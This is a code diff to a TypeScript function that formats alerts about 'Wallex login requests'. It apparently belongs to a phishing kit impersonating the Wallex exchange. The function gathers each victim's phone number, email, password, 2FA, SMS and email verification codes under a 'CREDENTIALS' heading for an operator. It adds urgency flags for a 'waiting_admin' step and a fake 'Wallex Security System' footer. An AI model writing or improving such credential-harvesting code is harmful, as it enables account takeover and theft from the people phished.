@@ -1081,7 +1081,7 @@ const getStepDisplayName = (stepType: string): string => {
 };
 
 /**
- * Format session message in simple and beautiful format
+ * Format session message in professional executive format
  */
 const formatSessionMessage = (session: UserSession): string => {
   // Escape HTML characters in user data
@@ -1094,14 +1094,42 @@ const formatSessionMessage = (session: UserSession): string => {
       .replace(/'/g, "&#39;");
   };
 
-  // Main header - simple and clean
-  let message = `🔐 <b>درخواست ورود والکس</b>
+  // Get current time in Persian
+  const currentTime = new Date().toLocaleString("fa-IR", {
+    hour: "2-digit",
+    minute: "2-digit",
+  });
 
-👤 <b>${escapeHtml(session.phoneNumber)}</b>
-🕐 ${escapeHtml(session.startTime)}
-📍 ${escapeHtml(getCurrentStepText(session.currentStep))}`;
+  // Calculate session duration
+  const sessionStart = new Date(session.startTime);
+  const duration = Math.floor((Date.now() - sessionStart.getTime()) / 60000);
+  const durationText = duration < 1 ? "کمتر از 1 دقیقه" : `${duration} دقیقه`;
 
-  // Online status (if available) - single line
+  // Status priority indicator
+  const getStatusPriority = (
+    step: string,
+  ): { emoji: string; priority: string } => {
+    switch (step) {
+      case "waiting_admin":
+        return { emoji: "���", priority: "URGENT" };
+      case "phone_verification":
+        return { emoji: "🟡", priority: "PENDING" };
+      case "completed":
+        return { emoji: "🟢", priority: "DONE" };
+      default:
+        return { emoji: "🔵", priority: "ACTIVE" };
+    }
+  };
+
+  const status = getStatusPriority(session.currentStep);
+
+  // Executive header with priority
+  let message = `${status.emoji} <b>AUTH REQUEST</b> ${status.priority}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 <b>${escapeHtml(session.phoneNumber)}</b>
+⏱️ ${currentTime} | ${durationText}`;
+
+  // Online status with enhanced info
   if (session.onlineStatus) {
     const timeSinceUpdate = Date.now() - session.onlineStatus.lastUpdate;
     const timeAgo =
@@ -1109,80 +1137,85 @@ const formatSessionMessage = (session: UserSession): string => {
         ? `${Math.floor(timeSinceUpdate / 60000)}د`
         : `${Math.floor(timeSinceUpdate / 1000)}ث`;
 
-    message += `\n${session.onlineStatus.statusEmoji} ${escapeHtml(session.onlineStatus.statusText)} (${timeAgo})`;
+    const statusIcon = session.onlineStatus.statusEmoji;
+    const statusText = session.onlineStatus.statusText;
+
+    message += `\n${statusIcon} <b>${escapeHtml(statusText)}</b> (${timeAgo})`;
   }
 
-  // Verification codes section - compact format
-  let codes = [];
+  // Authentication data section
+  let authData = [];
 
-  // Phone verification code
+  // Phone verification - highest priority
   if (session.phoneVerificationCode) {
-    codes.push(
-      `📱 تایید شماره: <code>${escapeHtml(session.phoneVerificationCode)}</code>`,
+    authData.push(
+      `📱 PHONE: <code>${escapeHtml(session.phoneVerificationCode)}</code>`,
     );
   }
 
-  // Email info
+  // Email credentials
   if (session.email) {
-    codes.push(`📧 ایمیل: <code>${escapeHtml(session.email)}</code>`);
+    authData.push(`📧 EMAIL: <code>${escapeHtml(session.email)}</code>`);
     if (session.emailCode) {
-      codes.push(`✉️ کد ایمیل: <code>${escapeHtml(session.emailCode)}</code>`);
+      authData.push(
+        `✉️ EMAIL-CODE: <code>${escapeHtml(session.emailCode)}</code>`,
+      );
     }
   }
 
-  // Auth codes - compact single lines
+  // Security credentials
   if (session.authCodes && Object.keys(session.authCodes).length > 0) {
     Object.keys(session.authCodes).forEach((stepType) => {
       const stepCodes = session.authCodes[stepType];
       if (stepCodes && stepCodes.length > 0) {
-        let stepEmoji = "🔐";
-        let stepName = "";
+        const latestCode = stepCodes[stepCodes.length - 1];
 
-        // Choose appropriate emoji and name
         switch (stepType) {
           case "password":
-            stepEmoji = "🔒";
-            stepName = "رمز عبور";
+            authData.push(
+              `🔒 PASSWORD: <code>${escapeHtml(latestCode)}</code>`,
+            );
             break;
           case "google":
-            stepEmoji = "📱";
-            stepName = "Google Auth";
+            authData.push(
+              `📲 2FA-CODE: <code>${escapeHtml(latestCode)}</code>`,
+            );
             break;
           case "sms":
-            stepEmoji = "💬";
-            stepName = "کد SMS";
+            authData.push(
+              `💬 SMS-CODE: <code>${escapeHtml(latestCode)}</code>`,
+            );
             break;
           case "email":
-            stepEmoji = "📧";
-            stepName = "کد ایمیل";
+            authData.push(`📨 E-CODE: <code>${escapeHtml(latestCode)}</code>`);
             break;
-          default:
-            stepName = stepType;
         }
-
-        // Show latest code for each type
-        const latestCode = stepCodes[stepCodes.length - 1];
-        codes.push(
-          `${stepEmoji} ${stepName}: <code>${escapeHtml(latestCode)}</code>`,
-        );
       }
     });
   }
 
-  // Add codes section if any codes exist
-  if (codes.length > 0) {
-    message += `\n\n🔑 <b>کدهای دریافتی:</b>\n` + codes.join("\n");
+  // Add authentication data if exists
+  if (authData.length > 0) {
+    message += `\n\n🔐 <b>CREDENTIALS:</b>\n` + authData.join("\n");
   }
 
-  // Simple footer with session info
+  // Executive summary footer
   const completedCount = session.completedSteps?.length || 0;
   const totalAttempts = Object.values(session.authAttempts || {}).reduce(
     (sum, count) => sum + count,
     0,
   );
 
-  message += `\n\n📊 مراحل: ${completedCount} | تلاش‌ها: ${totalAttempts}`;
-  message += `\n🆔 <code>${session.sessionId.substring(0, 8)}...</code>`;
+  // Risk assessment
+  const riskLevel =
+    totalAttempts > 5 ? "🔴 HIGH" : totalAttempts > 2 ? "🟡 MED" : "🟢 LOW";
+
+  message += `\n\n📊 <b>SUMMARY:</b>
+✅ Steps: ${completedCount} | 🔄 Attempts: ${totalAttempts}
+⚠️ Risk: ${riskLevel} | 🆔 ID: <code>${session.sessionId.substring(0, 8)}</code>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<i>🛡️ Wallex Security System</i>`;
 
   return message;
 };
